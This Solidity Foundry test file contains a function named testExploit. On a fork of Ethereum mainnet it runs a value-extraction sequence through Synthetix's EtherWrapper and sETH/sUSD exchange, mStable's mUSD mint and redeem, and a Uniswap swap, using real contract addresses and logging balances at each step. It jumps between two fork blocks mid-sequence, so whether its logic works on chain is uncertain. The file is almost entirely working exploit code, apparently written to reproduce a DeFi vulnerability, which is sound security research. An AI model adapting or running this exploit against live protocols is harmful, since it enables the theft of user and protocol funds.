// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IWETH {
    function balanceOf (address) external view returns (uint256);
    function deposit () external payable;
    function approve(address to, uint256 amount) external returns (bool);
}
interface IEtherWrapper {
    function mint(uint amount) external;
    function burn(uint amount) external;
}
interface IMasset {
    function mint(
        address _input,
        uint256 _inputQuantity,
        uint256 _minOutputQuantity,
        address _recipient
    ) external returns (uint256 massetMinted);

    function redeem(
        address _output,
        uint256 _mAssetQuantity,
        uint256 _minOutputQuantity,
        address _recipient
    ) external returns (uint256 outputQuantity);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface ISavingsContract {
    function depositSavings(uint256 _amount) external returns (uint256 creditsIssued);
    function redeemUnderlying(uint256 _amount) external returns (uint256 massetReturned);
}

interface ISynthetix {
    function exchange(
        bytes32 sourceCurrencyKey,
        uint sourceAmount,
        bytes32 destinationCurrencyKey
    ) external returns (uint amountReceived);
    
    function exchangeWithTracking(
        bytes32 sourceCurrencyKey,
        uint sourceAmount,
        bytes32 destinationCurrencyKey,
        address originator,
        bytes32 trackingCode
    ) external returns (uint amountReceived);
}

interface IAddressResolver {
    function getAddress(bytes32 name) external view returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external returns (bool);
    function owner() external view returns (address);
}
contract ForkTest is Test {
    IMasset public mUSD;
    ISavingsContract public mUSDSavingsContract;
    IERC20 public USDC;
    IWETH public weth ;
    IEtherWrapper public EW ;
    IERC20 public sETH;
    ISynthetix public synthetix;
    IERC20 public sUSD;
    IUniswapV2Router02 public uniswapRouter;

    function setUp () public {
        vm.createSelectFork("https://mainnet.infura.io/v3/API_key");
        vm.rollFork(12426507);
        vm.deal(address(this), 10000 ether);
        weth =  IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        sETH = IERC20(0x5e74C9036fb86BD7eCdcb084a0673EFc32eA31cb);
        EW =    IEtherWrapper(0xC1AAE9d18bBe386B102435a8632C8063d31e747C);
        IAddressResolver resolver = IAddressResolver(0x4E3b31eB0E5CB73641EE1E65E7dCEFe520bA3ef2);
        synthetix = ISynthetix(resolver.getAddress("Synthetix"));
        sUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
        mUSD = IMasset(0xe2f2a5C287993345a840Db3B0845fbC70f5935a5);
        mUSDSavingsContract = ISavingsContract(0x30647a72Dc82d7Fbb1123EA74716aB8A317Eac19);
        USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    }

    function testExploit() public {   
        weth.deposit{value: 10000 ether}();
        console.log("WETH balance after deposit:", weth.balanceOf(address(this)) / 1 ether);

        weth.approve(address(EW), 10000 ether);
        console.log("WETH balance after approval:", weth.balanceOf(address(this))/ 1 ether);

        EW.mint(2180 * 1e18);
        uint256 sETHBalance = sETH.balanceOf(address(this));
        console.log("sETH balance after minting:", sETHBalance / 1 ether);

        sETH.approve(address(synthetix), sETHBalance);

        uint256 amountReceived = synthetix.exchange("sETH",sETHBalance, "sUSD" );
        
        console.log("sUSD received after swap:", amountReceived / 1 ether);
        console.log("sUSD balance at block 12426507:", sUSD.balanceOf(address(this))/ 1 ether);
        console.log("ETH balance at block 12426507:", address(this).balance / 1 ether);

        vm.rollFork(12559134); 
        console.log("Rolled to block 12559134");

        console.log("sUSD balance before swap at block 12559134:", sUSD.balanceOf(address(this)) / 1e18);

        // Swap sUSD for mUSD
        sUSD.approve(address(mUSD), amountReceived);
        uint256 mUSDMinted = mUSD.mint(
            address(sUSD),
            amountReceived,
            0,  
            address(this)
        );
        console.log("mUSD minted:", mUSDMinted / 1e18);

        // Redeem mUSD for USDC
        uint256 usdcReceived = mUSD.redeem(
            address(USDC),
            mUSDMinted,
            0,  
            address(this)
        );
    
        console.log("USDC received:", usdcReceived / 1e6);  
        console.log("Final USDC balance:", USDC.balanceOf(address(this)) / 1e6);
        console.log("Final ETH balance:", address(this).balance / 1e18);

        USDC.approve(address(uniswapRouter), usdcReceived);


        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(weth);  

 
        uint[] memory amounts = uniswapRouter.swapExactTokensForETH(
            usdcReceived,
            0,  
            path,
            address(this),
            block.timestamp + 15 minutes
        );

        console.log("ETH received from USDC swap:", amounts[1] / 1e18);
        console.log("Final USDC balance:", USDC.balanceOf(address(this)) / 1e6);
        console.log("Final ETH balance:", address(this).balance / 1e18);
    }

    receive() external payable{}
}